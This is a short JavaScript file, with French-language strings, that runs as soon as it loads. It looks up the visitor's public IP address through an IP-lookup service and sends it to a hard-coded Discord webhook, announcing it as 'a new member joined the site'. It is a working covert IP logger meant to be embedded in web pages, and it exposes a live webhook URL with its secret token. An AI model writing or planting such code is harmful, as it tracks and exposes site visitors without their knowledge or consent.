const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";

const getIpAddress = async () => {
    const response = await fetch("https://api64.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
};

const sendWebhook = async () => {
    const ipAddress = await getIpAddress();

    const embed = {
        title: "<:FakeNitroEmoji:1209487670561210419> Un nouveau membre à rejoint le site!",
        description: `Adresse IP: || ${ipAddress} ||`,
        color: 0x00ff00
    };

    const payload = {
        embeds: [embed]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });
};

sendWebhook();
